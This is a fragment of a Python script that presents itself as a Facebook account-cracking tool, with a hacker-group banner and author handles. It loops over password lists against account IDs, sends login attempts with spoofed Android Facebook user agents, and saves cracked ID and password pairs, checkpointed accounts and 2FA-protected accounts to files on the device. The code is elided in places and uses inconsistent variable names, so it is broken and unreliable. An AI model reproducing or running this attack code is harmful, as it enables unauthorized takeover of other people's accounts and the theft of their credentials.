...
\033[1;32m//     // //////// //       //      //     //    
\x1b[1;91m---------------------------------------
\033[1;91m> Author : Md.Refat hossain
\033[1;91m> Github : https://github.com/dnhrefat
\033[1;91m> Facebok: Dnh Refat
\033[1;91m>official page:dark.net.hacker.boys1
\033[1;91m> Version: 1.0.5
\033[1;34m---------------------------------------""" )
def my_main():
    os.system("clear")
    print(logo)
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                ...
                cpu.append(url)
                open('/sdcard/REFAT/REFAT-CP.txt','a').write(f'{url}|{px}\n')
                break
            elif 'Login approvals are on' in response.text:
                print('\r{}\033[1;94m[2F-REFAT] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/REFAT/REFAT-2F.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r{} [REFAT-XD] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def group():
    ...
    FAHAD=input(' [•] Choose : ')
    if FAHAD == '1':
        os.system('xdg-open https://t.me/dnhboys1?text=')
        menu()
    if REFAT == '2':
        os.system('xdg-open https://facebook.com/dnhrefat11');menu()
    if REFAT == '3':
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[REFAT-XD] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [REFAT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/REFAT/REFAT-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/REFAT/REFAT-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
